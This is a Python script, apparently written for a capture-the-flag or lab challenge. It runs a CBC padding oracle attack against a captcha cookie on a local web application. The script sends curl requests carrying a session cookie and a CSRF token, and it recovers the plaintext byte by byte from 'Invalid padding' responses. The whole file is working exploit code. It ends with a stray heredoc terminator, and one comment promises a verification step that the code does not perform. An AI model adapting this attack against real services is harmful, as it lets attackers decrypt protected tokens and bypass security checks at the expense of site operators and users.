import sys,base64,subprocess,time
sess,csrf=sys.argv[1],sys.argv[2]
orig=base64.b64decode('iKwATCqbW3q78qHVTPyh0xBw2LFVRpf9p8BBmb9zGPA=')
iv=bytearray(orig[:16]); ct=orig[16:]
def oracle(ivc):
    v=base64.b64encode(bytes(ivc)+ct).decode()
    r=subprocess.run(['curl','-s','-b',f'captcha={v}; session={sess}','-X','POST','http://127.0.0.1:33105/','--data-urlencode',f'csrf_token={csrf}','--data-urlencode','username=x','--data-urlencode','captcha=AAAA'],capture_output=True,text=True)
    return r.stdout.strip()!='Invalid padding'
inter=bytearray(16)
plain=bytearray(16)
for pad in range(1,17):
    pos=16-pad
    for g in range(256):
        tmp=bytearray(iv)
        for k in range(pos+1,16):
            tmp[k]=inter[k]^pad
        tmp[pos]=g
        if oracle(tmp):
            # verify to avoid false positive when pad changes
            inter[pos]=g^pad
            plain[pos]=inter[pos]^iv[pos]
            print('pad',pad,'pos',pos,'byte',hex(plain[pos]),flush=True)
            break
    else:
        print('no byte found at',pos); break
print('plaintext bytes:',bytes(plain))
try:
    print('text:',bytes(plain).decode())
except Exception as e: print(e)
PY
